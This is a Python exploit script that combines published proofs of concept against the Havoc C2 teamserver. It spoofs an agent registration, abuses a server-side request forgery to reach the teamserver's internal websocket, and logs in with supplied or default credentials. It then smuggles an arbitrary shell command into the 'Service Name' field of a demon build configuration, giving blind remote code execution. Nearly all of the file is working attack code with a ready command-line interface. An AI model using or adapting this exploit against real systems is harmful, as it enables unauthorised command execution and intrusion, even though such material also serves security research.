import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()
import hashlib
import json
import struct 

from Crypto.Cipher import AES
from Crypto.Util import Counter

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes 
    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext


def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)


def encrypt(key, iv, plaintext):
    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"
        assert len(key) == key_bytes
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"


    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")

def apply_mask(payload):
    mask = random.getrandbits(32).to_bytes(4, 'big')
    masked_data = bytearray()
    for i, byte in enumerate(payload):
        masked_data.append(int.from_bytes(byte.encode()) ^ mask[i % 4])
    print(f"mask: {mask}\nmasked data: {masked_data}")
    return mask + masked_data
"""
def create_websocket_frame(payload):
    # WebSocket frame header (1 byte for FIN, RSV, opcode, and length)
    first_byte = 0b10000001  # FIN flag, no RSV, Text frame
    payload_length = len(payload)
    
    # Determine payload length representation
    if payload_length <= 125:
        frame_header = struct.pack("B", first_byte) + struct.pack("B", payload_length)
    elif payload_length <= 65535:
        frame_header = struct.pack("B", first_byte) + struct.pack("B", 126) + struct.pack(">H", payload_length)
    else:
        frame_header = struct.pack("B", first_byte) + struct.pack("B", 127) + struct.pack(">Q", payload_length)
    
    # Apply mask (only for client-to-server communication)
    masked_payload = apply_mask(payload)
    
    return frame_header + masked_payload
"""

def create_websocket_frame(payload):
    if isinstance(payload, str):
        payload = payload.encode('utf-8')

    payload_length = len(payload)
    fin_and_opcode = 0x81  # FIN bit set and text frame opcode
    frame_header = bytearray([fin_and_opcode])

    # Prepare the payload length and extended payload length if needed
    if payload_length <= 125:
        frame_header.append(0x80 | payload_length)
    elif payload_length <= 65535:
        frame_header.append(0x80 | 126)
        frame_header.extend(struct.pack(">H", payload_length))
    else:
        frame_header.append(0x80 | 127)
        frame_header.extend(struct.pack(">Q", payload_length))
    mask = bytearray(random.getrandbits(8) for _ in range(4))
    frame_header.extend(mask)

    # Apply the mask to the payload
    masked_payload = bytearray(
        byte ^ mask[i % 4] for i, byte in enumerate(payload)
    )

    return bytes(frame_header + masked_payload)




def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""


    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]

defaultUser = "Neo"
defaultPassword = "password1234"

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-c", "--cmd", help="Blind command to perform. No output will be given.", required=True)
parser.add_argument("-u", "--user", help="The username to authenticate to teamserver with", default=defaultUser)
parser.add_argument("-p", "--password", help="Password for joining teamserver", default=defaultPassword)
parser.add_argument("-i", "--ip", help="The IP of the Havoc Teamserver. Use 127.0.0.1 in most instances.", default="127.0.0.1")
parser.add_argument("-P", "--port", help="The teamserver port", default="40056")
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-U", "--spoofed-username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "---internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")
parser.add_argument("-q", "--quiet", help="Don't show banner", default=False)
args = parser.parse_args()

banner = """
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│██   ██  █████  ██    ██  ██████   ██████     ██   ██  █████   ██████ ██   ██ ██████   █████   ██████ ██   ██ │
│██   ██ ██   ██ ██    ██ ██    ██ ██          ██   ██ ██   ██ ██      ██  ██  ██   ██ ██   ██ ██      ██  ██  │
│███████ ███████ ██    ██ ██    ██ ██          ███████ ███████ ██      █████   ██████  ███████ ██      █████   │
│██   ██ ██   ██  ██  ██  ██    ██ ██          ██   ██ ██   ██ ██      ██  ██  ██   ██ ██   ██ ██      ██  ██  │
│██   ██ ██   ██   ████    ██████   ██████     ██   ██ ██   ██  ██████ ██   ██ ██████  ██   ██  ██████ ██   ██ │
│                                                                                                              │
│                                                                                                              │
└──────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
RCE through an SSRF against havoc teamserver. 

Credit to chebuya and hyperreality for finding and writing up the PoCs. This Script just combines them.
https://github.com/chebuya/Havoc-C2-SSRF-poc/
https://github.com/IncludeSecurity/c2-vulnerabilities/
"""
if (args.quiet == False):
    print(banner)

if (args.user == defaultUser):
    print(f"-----------Warning: No username provided, using default username {args.user}------------")

if (args.password == defaultPassword):
    print(f"-------Warning: No password provided, using default password {args.password}-------")

# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.spoofed_username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

print("\nAttempting WebSocket connection through SSRF....")
request_data = f"GET /havoc/ HTTP/1.1\r\nUpgrade: websocket\r\nHost: {args.ip}:{args.port}\r\nOrigin: http://{args.ip}:{args.port}\r\nSec-WebSocket-Key: vRSFWh1+bkqb1n4ZGNMIQQ==\r\nSec-WebSocket-Version: 13\r\nConnection: Upgrade\r\n\r\n"
write_socket(socket_id, request_data.encode())
print(read_socket(socket_id))

print(f"\nBuilding websocket demon.\nAuthenticating with user: {args.user} and password {args.password}")

payload1 = {"Body": {"Info": {"Password": hashlib.sha3_256(args.password.encode()).hexdigest(), "User": args.user}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": args.user}}
websocket_frame1 = create_websocket_frame(json.dumps(payload1))
write_socket(socket_id, websocket_frame1)
print(read_socket(socket_id))

print(f"\nAttempting to run command: {args.cmd}")
injection = """ \\\\\\\" -mbla; """ + args.cmd + """ 1>&2 && false #"""
# Command injection in demon compilation command
payload2 = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": { "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": args.user}}
websocket_frame2 = create_websocket_frame(json.dumps(payload2))
write_socket(socket_id,websocket_frame2)
print(read_socket(socket_id))

